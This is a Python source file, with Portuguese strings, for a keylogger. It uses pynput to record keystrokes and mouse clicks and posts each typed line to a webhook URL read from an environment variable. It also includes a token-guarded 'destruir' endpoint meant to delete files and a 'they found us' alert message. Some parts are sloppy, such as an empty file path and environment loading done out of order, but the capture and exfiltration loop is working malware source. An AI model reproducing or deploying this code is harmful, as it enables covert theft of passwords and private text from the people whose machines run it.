from pynput.keyboard import Key, Listener
from pynput import mouse
import requests
from dotenv import load_dotenv
import os
from threading import Thread
from fastapi import FastAPI, HTTPException

app = FastAPI()

secret_token = os.getenv('SECRET_TOKEN')

@app.post('/destruir')
def destruir(token: str):
    if token != secret_token:
        raise HTTPException(status_code=403, detail='ACESSO NEGADO MEU PATRÃO RSRS')

    os.remove('')    

load_dotenv()

fullog = ''
words = ''

url = os.getenv('webhook_url_mv')

def onPress(key):
    global fullog
    global words

    if key == Key.space:
        words += ' '

    elif key == Key.enter:
        fullog += words + '\n'
        send(fullog)
        words = ''
        fullog = ''

    elif key == Key.backspace:
        words = words[:-1]
    else:
        try:
            char = key.char
            if char:
                words += char
        except AttributeError:
            # Ignora outras teclas não caractere
            pass

    if key == Key.esc:
        return False

def click(x, y, button, pressed):
    global fullog
    global words

    if len(words) > 0 and pressed:
        fullog += words + '\n'
        send(fullog)
        words = ''
        fullog = ''


def send(mensagem):
    payload = {
        'content': mensagem
    }
    response = requests.post(url, json=payload)
    return response

def on_stop():
    print("Listener parado!")

k_listener = Listener(on_press=onPress, on_stop=on_stop)
k_listener.start()
k_listener.join()

send('DESCOBRIRAM A GENTE')

def main():
    k_listener = Listener(on_press=onPress)
    m_listener = mouse.Listener(on_click=click)

    k_listener.start()
    m_listener.start()

    k_listener.join()
    m_listener.join()

if __name__ == "__main__":
    main()
